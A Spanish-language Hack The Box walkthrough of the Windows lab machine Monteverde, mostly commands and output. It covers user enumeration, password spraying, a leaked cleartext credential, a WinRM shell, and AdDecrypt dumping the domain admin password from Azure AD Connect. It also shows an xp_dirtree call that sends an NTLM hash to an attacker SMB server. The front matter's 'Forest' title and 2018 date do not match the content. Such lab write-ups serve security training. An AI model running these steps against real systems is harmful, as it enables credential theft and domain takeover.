---
layout: single
title: Forest - Hack The Box
excerpt: "Tocamos directorio activo"
date: 2018-11-24
classes: wide
header:
  teaser: /assets/images/htb-forest/forest1.png
categories:
  - hackthebox
  - infosec
tags:
  - hackthebox
  - AD
  - Windows  
---

# 10.10.10.172 - Monteverde
![](/assets/images/htb-monteverde/monteverde1.png)

-------------------------
# Part 1: Reconocimiento inicial y obtención de credenciales

Puertos abiertos -> 88(kerberos), 135(rpc), 139, 464, 5985(winrm)  
Con crackmapexec podemos hacer un reconocimiento del dominio como sacar el nombre y sistema:  
```console
└─$ crackmapexec smb 10.10.10.172
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
```

## Puerto 135 RPC:
Tenemos suerte y podemos tirar de una null session:  
```console
└─$ rpcclient -U "" 10.10.10.172 -N -c "enumdomusers" | grep -oP "\[.*?\]" | grep -v "0x" | tr -d "[]" >> users.txt
# Una buena lista de usaurios
└─$ rpcclient -U "" 10.10.10.172 -N -c "enumdomgroups"
# Nos copiamos en un archivo de texto los grupos, ya que hay alguno interesante. No tenemos el clásico domain admins pero si Azure Admins
└─$ rpcclient -U "" 10.10.10.172 -N -c "querygroupmem 0xa29" 
# Los de Azure -> 0x1f4, 0x450, 0x641. EL problema esque si preguntamos por queryuser y uno nos da access denied
```

## Puerto 88 kerberos:  
```console
└─$ kerbrute userenum --dc 10.10.10.172 -d megabank.local users.txt
# Todos validos
└─$ /usr/bin/impacket-GetNPUsers megabank.local/ -no-pass -usersfile users.txt  
# Todos tienen el UF_DONT_REQUIRE_PREAUTH seteado, asi que nada de contraseñas.
```

## SMB - Crackmapexec  
Como no tenemos creds, se pueden sacar de maneras como el nombre de la máquina, o...    
El nombre del propio usaurio (u otro usuario por si son pareja). Un error como un piano.  
```console
└─$ crackmapexec smb 10.10.10.172 -u users.txt -p users.txt --continue-on-succes 
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

Probamos otro ultimo ataque por kerberos al conseguir creds:
```console
└─$ impacket-GetUserSPNs megabank.local/SABatchJobs:SABatchJobs -dc-ip 10.10.10.172 -request
# No hay suerte
```
---------------------------
# Part 2: Acceso al sistema

Seguimos con SMB. Voy mostrando los unicos lugares que no están vacíos    
```console
└─$ smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs'
# Tenemos acceso a "azure_uploads", "IPC$", "NELOGON", "SYSVOL" y users$"" 
└─$ smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' -r "users$"
# Hay varias carpetas "dgalanos", "mhope", "smorgan" y "roleary". Solo mhope tiene un archivo "azure.xml"
└─$ smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' --download "users$/mhope/azure.xml"
└─$ cat 10.10.10.172-users_mhope_azure.xml 
<ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
<S N="Password">4n0therD4y@n0th3r$</S>
```
El mhope este era uno de los usaurios que obtuvimos del RPC, y esta parece su contraseña.  
```console
└─$ crackmapexec smb 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$
```
En efecto. Vuelvo a probar el GetUsersSPNs con estas nuevas creds pero tampoco. Con el smbmap no encuentro nada más que con la otra chica.  
```console
└─$ crackmapexec winrm 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'
WINRM       10.10.10.172    5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
└─$ evil-winrm -i 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'  
*Evil-WinRM* PS C:\Users\mhope\Documents>
```
Tras una enumeración con mi script de windows  
- Nuestro mhope pertenece a "Azure Admins" y "Domain Users"  
- Hay backups del SAM y system en C:\Windows\System32\config\  

---------------------------
# Part 3: Explotación de Azure AD

Al ser un dominio Azure está configurado de manera diferente, remota. Al ser algo instalado de fuera habría que mirar en "Program Files":  
```console
*Evil-WinRM* PS C:\Program Files> dir | findstr "Azure"
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
```

En este [articulo](https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/) hablan de uan vuln en Azure AD que permite obtener
las creds del Administrador subiendo dos archivos:  
- Habría que descargarse la [release](https://github.com/VbScrub/AdSyncDecrypt/releases/download/v1.0/AdDecrypt.zip) y subirla al sistema
```console
*Evil-WinRM* PS C:\Users\mhope\Desktop> upload /home/cucuxii/Maquinas/htb/Monteverde/mcrypt.dll
*Evil-WinRM* PS C:\Users\mhope\Desktop> upload /home/cucuxii/Maquinas/htb/Monteverde/AdDecrypt.exe
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> C:\Users\mhope\Desktop\AdDecrypt.exe -FullSQL
Username: administrator
Password: d0m@in4dminyeah!
```

Ahora te podrias conectar como admin ```evil-winrm -i 10.10.10.172 -u 'administrator' -p 'd0m@in4dminyeah!'```

--------------------------------------
# Extra: Analizando la vuln de Azure

Investigué mas en profundidad esta vuln gracias a estos articulos: 
[Fuente](https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/)    
[FUente 2](https://blog.xpnsec.com/azuread-connect-for-redteam/)    
[Video](https://www.youtube.com/watch?v=JEIR5oGCwdg)    

El servicio "Azure AD Connect" conecta el directorio activo local con la plataforma de dominios de Azure. Dicho servicio, (para gestionar desde
Azure tu sistema) necesita credenciales de administrador. 
El zip que te descargas tiene estos dos programas que subes:   
- **AdDecrypt.exe** -> Las creds se sacan de una SQL llamada "ADSync" (tablas mms_management y mms_server) y se desencriptan.     
- **mcrypt.dll** -> Codigo en C# que se encarga de descenriptar lo sacado antes (DPAPI)  

Ivestigando el articulo de esa persona podemos navegar por las bases de datos que dice:  
```console
*Evil-WinRM* PS C:\Users\mhope\Desktop> sqlcmd -Q "select name from sys.databases"
master, tempdb, model, msdb, ADSync

*Evil-WinRM* PS C:\Users\mhope\Desktop> sqlcmd -Q "xp_dirtree '\\10.10.14.12\carpeta'"
└─$ impacket-smbserver carpeta $(pwd) -smb2support

[*] MONTEVERDE$::MEGABANK:aaaaaaaaaaaaaaaa:51e2852a7fe64f40ec474fe257c9eec8:0101000000000000001e935bacfdd80160fc5fcc717a077e00000000010010005700460047007800730059006d005800030010005700460047007800730059006d00580002001000670074006d006d00790075006e00610004001000670074006d006d00790075006e00610007000800001e935bacfdd80106000400020000000800300030000000000000000000000000300000c42f279549204924bbc39fce074dc6fdd4df5f988eee2073af01708ebd8864090a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310032000000000000000000
```
Vemos que se ha enviado un hash por ahí que hemos interceptado, es decir alguien ( megabank.local) se ha autenticado contra alguien (Azure).  
Si vemos el script del artículo e intentamos replicar la query:  
```console
*Evil-WinRM* PS C:\Users\mhope\Desktop> sqlcmd -Q "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
Invalid object name 'mms_management_agent'

*Evil-WinRM* PS C:\Users\mhope\Desktop> sqlcmd -Q "use ADSync; select private_configuration_xml,encrypted_configuration from mms_management_agent"
 <forest-name>MEGABANK.LOCAL</forest-name>
 <forest-port>0</forest-port>
 <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
 <forest-login-user>administrator</forest-login-user>
 <forest-login-domain>MEGABANK.LOCAL 8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g

*Evil-WinRM* PS C:\Users\mhope\Desktop> sqlcmd -Q "use ADSync; select keyset_id,instance_id,entropy from mms_server_configuration"
keyset_id   instance_id                          entropy
          1 1852B527-DD4F-4ECF-B541-EFCCBFF29E31 194EC2FC-F186-46CF-B44D-071EB61F49CD
```

Obtenemos las dos cosas que necesita para obtener las credenciales.  La cadena "8AAAAAgAAABQhCBBnwTpdfQE6uNJe..." está en base 64, si se decodifica
salen caracteres sin sentido (que supongo que será el texto cifrado). Si le haces ```xxd -ps | xargs``` obtendrías todos los bytes. Esto se lo pasa al
**mcrypt.dll** que lo rompe.  

Mas detalles se escapan de mi entendimiento, pero al menos hemos sacado una idea de lo que está haciendo a grosso modo.  